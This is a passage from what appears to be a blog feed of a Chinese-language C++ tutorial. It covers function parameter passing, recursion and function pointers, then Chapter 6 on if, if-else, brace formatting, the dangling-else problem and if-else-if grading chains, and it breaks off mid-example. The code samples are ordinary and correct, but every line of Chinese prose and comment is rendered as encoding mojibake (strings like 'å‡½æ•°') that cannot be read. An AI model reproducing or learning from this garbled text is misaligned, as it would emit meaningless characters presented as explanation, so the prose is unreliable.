é€’ä»¥è·å¾—æ•ˆç‡å’Œå®‰å…¨æ€§ï¼Œæˆ–æŒ‰å¼•ç”¨ (<code>T&amp;</code>) ä¼ é€’ä»¥å…è®¸ä¿®æ”¹ã€‚</li></ul></li><li><p><strong>å‡½æ•°ä¸ç‰¹å®šç±»å‹:</strong></p><ul><li>  <strong>C-é£æ ¼å­—ç¬¦ä¸²:</strong> ä½œä¸º <code>char*</code> ä¼ é€’ï¼Œä¾èµ– <code>\0</code> ç»“æŸç¬¦ã€‚è¿”å› C é£æ ¼å­—ç¬¦ä¸²æ¯”è¾ƒå¤æ‚ï¼Œæ¨èè®©è°ƒç”¨è€…æä¾›ç¼“å†²åŒºã€‚</li><li>  <strong><code>std::string</code> å¯¹è±¡:</strong> ä½¿ç”¨ <code>const std::string&amp;</code> ä¼ é€’æ˜¯å¸¸ç”¨æ–¹å¼ã€‚è¿”å› <code>std::string</code> é€šå¸¸å›  RVO/NRVO è€Œé«˜æ•ˆã€‚</li><li>  <strong><code>std::array</code> å¯¹è±¡:</strong> è¡Œä¸ºç±»ä¼¼ç»“æ„ï¼Œå¤§å°æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†ã€‚æ¨èä½¿ç”¨ <code>const std::array&lt;T, N&gt;&amp;</code> ä¼ é€’ã€‚</li></ul></li><li><p> <strong>é€’å½’:</strong> å‡½æ•°è°ƒç”¨è‡ªèº«æ¥è§£å†³é—®é¢˜ã€‚éœ€è¦æ˜ç¡®çš„<strong>åŸºçº¿æ¡ä»¶</strong>æ¥åœæ­¢é€’å½’ï¼Œä»¥åŠä½¿é—®é¢˜è§„æ¨¡ç¼©å°çš„<strong>é€’å½’æ­¥éª¤</strong>ã€‚é€’å½’å¯ä»¥ä½¿æŸäº›é—®é¢˜çš„ä»£ç ç®€æ´ï¼Œä½†å¯èƒ½æ•ˆç‡ä½æˆ–å¯¼è‡´æ ˆæº¢å‡ºã€‚</p></li><li><p> <strong>å‡½æ•°æŒ‡é’ˆ:</strong> æŒ‡å‘å‡½æ•°åœ°å€çš„æŒ‡é’ˆå˜é‡ã€‚å…è®¸å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ã€åœ¨è¿è¡Œæ—¶é€‰æ‹©å‡½æ•°ç­‰ã€‚å£°æ˜æ—¶éœ€åŒ¹é…å‡½æ•°ç­¾åï¼ˆè¿”å›ç±»å‹å’Œå‚æ•°ç±»å‹ï¼‰ã€‚<code>typedef</code> æˆ– <code>using</code> å¯ç®€åŒ–å…¶å£°æ˜ã€‚</p></li></ol><p>é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº†å¦‚ä½•æœ‰æ•ˆåœ°å®šä¹‰å’Œä½¿ç”¨å‡½æ•°æ¥æ„å»ºæ¨¡å—åŒ–ã€å¯é‡ç”¨å’Œå¯ç»´æŠ¤çš„ C++ ç¨‹åºï¼Œå¹¶äº†è§£äº†ä¸åŒæ•°æ®ç±»å‹åœ¨å‡½æ•°å‚æ•°ä¼ é€’ä¸­çš„è¡Œä¸ºå’Œæœ€ä½³å®è·µã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 6 åˆ†æ”¯è¯­å¥å’Œé€»è¾‘è¿ç®—ç¬¦</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_6/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_6/</url>
      
        <content type="html"><![CDATA[<h2 id="6-1-ifè¯­å¥"><a href="#6-1-ifè¯­å¥" class="headerlink" title="6.1 ifè¯­å¥"></a>6.1 ifè¯­å¥</h2><p>åˆ†æ”¯è¯­å¥å…è®¸ç¨‹åºæ ¹æ®ç‰¹å®šæ¡ä»¶é€‰æ‹©æ‰§è¡Œä¸åŒçš„ä»£ç è·¯å¾„ã€‚<code>if</code> è¯­å¥æ˜¯ C++ ä¸­æœ€åŸºæœ¬çš„åˆ†æ”¯ç»“æ„ï¼Œå®ƒå…è®¸ç¨‹åºæ ¹æ®ä¸€ä¸ª<strong>æ¡ä»¶è¡¨è¾¾å¼ (Condition)</strong> çš„çœŸå‡æ¥å†³å®šæ˜¯å¦æ‰§è¡ŒæŸæ®µä»£ç ã€‚</p><p><strong>åŸºæœ¬è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ condition ä¸º trueï¼Œåˆ™æ‰§è¡Œè¿™é‡Œçš„è¯­å¥</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æˆ–è€…å¦‚æœåªæœ‰ä¸€æ¡è¯­å¥</span></span><br><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    single_statement;</span><br></pre></td></tr></table></figure><ul><li>  <strong><code>condition</code></strong>: ä¸€ä¸ªæ±‚å€¼ä¸ºå¸ƒå°”å€¼ (<code>true</code> æˆ– <code>false</code>) çš„è¡¨è¾¾å¼ã€‚é€šå¸¸æ˜¯å…³ç³»è¡¨è¾¾å¼ï¼ˆå¦‚ <code>x &gt; 5</code>, <code>name == &quot;Alice&quot;</code>ï¼‰æˆ–é€»è¾‘è¡¨è¾¾å¼ã€‚éé›¶å€¼è¢«è§†ä¸º <code>true</code>ï¼Œé›¶å€¼è¢«è§†ä¸º <code>false</code>ã€‚</li><li>  <strong><code>&#123; ... &#125;</code></strong>: èŠ±æ‹¬å·å®šä¹‰äº†ä¸€ä¸ªè¯­å¥å—ã€‚å¦‚æœæ¡ä»¶ä¸º <code>true</code>ï¼Œåˆ™æ‰§è¡Œå—å†…çš„æ‰€æœ‰è¯­å¥ã€‚å¦‚æœåªæœ‰ä¸€æ¡è¯­å¥éœ€è¦æ ¹æ®æ¡ä»¶æ‰§è¡Œï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å·ï¼Œä½†ä¸ºäº†æ¸…æ™°å’Œé¿å…é”™è¯¯ï¼Œ<strong>é€šå¸¸æ¨èæ€»æ˜¯ä½¿ç”¨èŠ±æ‹¬å·</strong>ã€‚</li></ul><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><ol><li> è®¡ç®— <code>condition</code> çš„å€¼ã€‚</li><li> å¦‚æœ <code>condition</code> ä¸º <code>true</code>ï¼Œæ‰§è¡Œ <code>if</code> è¯­å¥åé¢çš„è¯­å¥ï¼ˆæˆ–è¯­å¥å—ï¼‰ã€‚</li><li> å¦‚æœ <code>condition</code> ä¸º <code>false</code>ï¼Œè·³è¿‡ <code>if</code> è¯­å¥åé¢çš„è¯­å¥ï¼ˆæˆ–è¯­å¥å—ï¼‰ï¼Œç»§ç»­æ‰§è¡Œ <code>if</code> ç»“æ„ä¹‹åçš„ä»£ç ã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temperature;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the current temperature (Celsius): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; temperature;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç®€å•çš„ if è¯­å¥</span></span><br><span class="line">    <span class="keyword">if</span> (temperature &gt; <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s hot outside!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Remember to stay hydrated.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (temperature &lt; <span class="number">10</span>)</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s cold, wear a jacket!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åªæœ‰ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å·</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temperature check finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„ <code>temperature</code> å¤§äº 30ï¼Œä¼šæ‰“å°ä¸¤æ¡æ¶ˆæ¯ï¼›å¦‚æœå°äº 10ï¼Œä¼šæ‰“å°å¦ä¸€æ¡æ¶ˆæ¯ï¼›å¦åˆ™ï¼Œè¿™äº› <code>if</code> å—å†…çš„ä»£ç ä¼šè¢«è·³è¿‡ã€‚</p><h3 id="6-1-1-if-elseè¯­å¥"><a href="#6-1-1-if-elseè¯­å¥" class="headerlink" title="6.1.1 if elseè¯­å¥"></a>6.1.1 if elseè¯­å¥</h3><p><code>if</code> è¯­å¥å…è®¸æˆ‘ä»¬åœ¨æ¡ä»¶ä¸ºçœŸæ—¶æ‰§è¡Œä»£ç ï¼Œä½†å¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨æ¡ä»¶ä¸ºå‡æ—¶æ‰§è¡Œ<strong>å¦ä¸€æ®µ</strong>ä»£ç ï¼Œå°±éœ€è¦ä½¿ç”¨ <code>if else</code> ç»“æ„ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ condition ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— (if block)</span></span><br><span class="line">    statement_block_1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ condition ä¸º falseï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— (else block)</span></span><br><span class="line">    statement_block_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><ol><li> è®¡ç®— <code>condition</code> çš„å€¼ã€‚</li><li> å¦‚æœ <code>condition</code> ä¸º <code>true</code>ï¼Œæ‰§è¡Œ <code>if</code> åé¢çš„è¯­å¥å— (<code>statement_block_1</code>)ï¼Œç„¶åè·³è¿‡ <code>else</code> åé¢çš„è¯­å¥å— (<code>statement_block_2</code>)ã€‚</li><li> å¦‚æœ <code>condition</code> ä¸º <code>false</code>ï¼Œè·³è¿‡ <code>if</code> åé¢çš„è¯­å¥å— (<code>statement_block_1</code>)ï¼Œæ‰§è¡Œ <code>else</code> åé¢çš„è¯­å¥å— (<code>statement_block_2</code>)ã€‚</li><li> æ‰§è¡Œå®Œé€‰æ‹©çš„å—åï¼Œç¨‹åºç»§ç»­æ‰§è¡Œ <code>if else</code> ç»“æ„ä¹‹åçš„ä»£ç ã€‚</li></ol><p><strong>å…³é”®ç‚¹:</strong> <code>if</code> å—å’Œ <code>else</code> å—æ˜¯<strong>äº’æ–¥</strong>çš„ï¼Œç¨‹åºåªä¼šæ‰§è¡Œå…¶ä¸­ä¸€ä¸ªã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You are eligible to vote.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You are not yet eligible to vote.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> years_to_wait = <span class="number">18</span> - age;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You need to wait &quot;</span> &lt;&lt; years_to_wait &lt;&lt; <span class="string">&quot; more year(s).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age check complete.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºä¼šæ ¹æ®ç”¨æˆ·è¾“å…¥çš„å¹´é¾„ï¼Œæ‰“å°ä¸¤æ¡ä¸åŒçš„æ¶ˆæ¯ä¹‹ä¸€ã€‚</p><h3 id="6-1-2-æ ¼å¼åŒ–if-elseè¯­å¥"><a href="#6-1-2-æ ¼å¼åŒ–if-elseè¯­å¥" class="headerlink" title="6.1.2 æ ¼å¼åŒ–if elseè¯­å¥"></a>6.1.2 æ ¼å¼åŒ–if elseè¯­å¥</h3><p>æ¸…æ™°çš„ä»£ç æ ¼å¼å¯¹äºå¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§è‡³å…³é‡è¦ã€‚å¯¹äº <code>if else</code> è¯­å¥ï¼Œæ¨èéµå¾ªä»¥ä¸‹æ ¼å¼åŒ–çº¦å®šï¼š</p><ol><li> <strong>ä½¿ç”¨èŠ±æ‹¬å· <code>&#123;&#125;</code>:</strong> å³ä½¿ <code>if</code> æˆ– <code>else</code> åé¢åªæœ‰ä¸€æ¡è¯­å¥ï¼Œä¹Ÿæ¨èä½¿ç”¨èŠ±æ‹¬å·ã€‚è¿™å¯ä»¥é˜²æ­¢åœ¨åç»­æ·»åŠ ä»£ç æ—¶å¼•å…¥æ‚¬æŒ‚ <code>else</code> (dangling else) ç­‰é”™è¯¯ï¼Œå¹¶ä½¿ä»£ç ç»“æ„æ›´æ¸…æ™°ã€‚</li><li> <strong>ç¼©è¿›:</strong> <code>if</code> å’Œ <code>else</code> å—å†…éƒ¨çš„è¯­å¥åº”è¯¥ç›¸å¯¹äº <code>if</code> å’Œ <code>else</code> å…³é”®å­—è¿›è¡Œç¼©è¿›ï¼ˆé€šå¸¸æ˜¯ 4 ä¸ªç©ºæ ¼æˆ–ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼‰ã€‚</li><li> <strong><code>else</code> çš„ä½ç½®:</strong> <code>else</code> å…³é”®å­—é€šå¸¸ä¸å¯¹åº”çš„ <code>if</code> è¯­å¥çš„å³èŠ±æ‹¬å· <code>&#125;</code> æ”¾åœ¨åŒä¸€è¡Œï¼Œæˆ–è€…å•ç‹¬æ”¾åœ¨ä¸‹ä¸€è¡Œå¹¶ä¸ <code>if</code> å¯¹é½ã€‚ä¸¤ç§é£æ ¼éƒ½å¾ˆå¸¸è§ã€‚</li></ol><p><strong>ç¤ºä¾‹ (æ¨èçš„æ ¼å¼):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é£æ ¼ 1: else ä¸ if çš„ &#125; åœ¨åŒä¸€è¡Œ</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é£æ ¼ 2: else å•ç‹¬ä¸€è¡Œï¼Œä¸ if å¯¹é½</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸æ¨èçš„æ ¼å¼ (å³ä½¿åªæœ‰ä¸€æ¡è¯­å¥)</span></span><br><span class="line"><span class="comment">// if (condition) statement1; else statement2; // å¯è¯»æ€§å·®ï¼Œæ˜“å‡ºé”™</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨èçš„æ ¼å¼ (å³ä½¿åªæœ‰ä¸€æ¡è¯­å¥)</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>æ‚¬æŒ‚ <code>else</code> é—®é¢˜:</strong></p><p>å½“ <code>if</code> è¯­å¥åµŒå¥—ä¸”çœç•¥èŠ±æ‹¬å·æ—¶ï¼Œ<code>else</code> ä¼šä¸<strong>æœ€è¿‘çš„æœªåŒ¹é…çš„ <code>if</code></strong> ç›¸å…³è”ï¼Œè¿™å¯èƒ½ä¸ç¬¦åˆé¢„æœŸã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é”™è¯¯çš„æ„å›¾ (å¯èƒ½æƒ³è®© else å¯¹åº”å¤–å±‚ if)</span></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Both positive&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">// è¿™ä¸ª else å®é™…ä¸Šå¯¹åº”çš„æ˜¯ if (b &gt; 0)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is not positive&quot;</span>; <span class="comment">// è¿™è¡Œä¸ä¼šæŒ‰é¢„æœŸæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ­£ç¡®çš„å†™æ³• (ä½¿ç”¨èŠ±æ‹¬å·æ˜ç¡®å…³è”)</span></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>) &#123; <span class="comment">// å¤–å±‚ if</span></span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) &#123; <span class="comment">// å†…å±‚ if</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Both positive&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// æ²¡æœ‰ else å¯¹åº”å†…å±‚ if</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// è¿™ä¸ª else å¯¹åº”å¤–å±‚ if (a &gt; 0)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is not positive&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å§‹ç»ˆä½¿ç”¨èŠ±æ‹¬å·å¯ä»¥å®Œå…¨é¿å…æ‚¬æŒ‚ <code>else</code> é—®é¢˜ã€‚</p><h3 id="6-1-3-if-else-if-elseç»“æ„"><a href="#6-1-3-if-else-if-elseç»“æ„" class="headerlink" title="6.1.3 if else if elseç»“æ„"></a>6.1.3 if else if elseç»“æ„</h3><p>å½“éœ€è¦ä»å¤šä¸ªäº’æ–¥çš„é€‰é¡¹ä¸­é€‰æ‹©ä¸€ä¸ªæ‰§è¡Œè·¯å¾„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>if else if else</code> ç»“æ„ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ç³»åˆ—åµŒå¥—çš„ <code>if else</code> è¯­å¥ï¼Œä½†é€šå¸¸å†™æˆæ›´æ‰å¹³çš„ç»“æ„ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition1) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ condition1 ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å—</span></span><br><span class="line">    statement_block_1;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ condition1 ä¸º false ä¸” condition2 ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å—</span></span><br><span class="line">    statement_block_2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition3) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ condition1 å’Œ condition2 éƒ½ä¸º false ä¸” condition3 ä¸º trueï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å—</span></span><br><span class="line">    statement_block_3;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// ... å¯ä»¥æœ‰æ›´å¤šçš„ else if åˆ†æ”¯</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœä»¥ä¸Šæ‰€æœ‰æ¡ä»¶éƒ½ä¸º falseï¼Œæ‰§è¡Œè¿™é‡Œçš„è¯­å¥å— (å¯é€‰çš„é»˜è®¤åˆ†æ”¯)</span></span><br><span class="line">    statement_block_default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><ol><li> ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ£€æŸ¥æ¯ä¸ª <code>if</code> å’Œ <code>else if</code> çš„æ¡ä»¶ã€‚</li><li> ä¸€æ—¦æ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸º <code>true</code> çš„æ¡ä»¶ï¼Œå°±æ‰§è¡Œå…¶å¯¹åº”çš„è¯­å¥å—ã€‚</li><li> æ‰§è¡Œå®Œè¯¥å—åï¼Œ<strong>è·³è¿‡</strong>æ‰€æœ‰å‰©ä½™çš„ <code>else if</code> å’Œ <code>else</code> åˆ†æ”¯ï¼Œç›´æ¥æ‰§è¡Œæ•´ä¸ª <code>if else if else</code> ç»“æ„ä¹‹åçš„ä»£ç ã€‚</li><li> å¦‚æœæ‰€æœ‰çš„ <code>if</code> å’Œ <code>else if</code> æ¡ä»¶éƒ½ä¸º <code>false</code>ï¼Œåˆ™æ‰§è¡Œæœ€åçš„ <code>else</code> å—ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚å¦‚æœä¸å­˜åœ¨æœ€åçš„ <code>else</code> å—ï¼Œåˆ™æ•´ä¸ªç»“æ„ä»€ä¹ˆä¹Ÿä¸æ‰§è¡Œã€‚</li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your numerical score (0-100): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> grade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &lt; <span class="number">0</span> || score &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid score entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        grade = <span class="string">&#x27;I&#x27;</span>; <span class="comment">// Invalid</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// score &lt; 60</span></span><br><span class="line">        grade = <span class="string">&#x27;F&#x27;</span>;</span><br><span 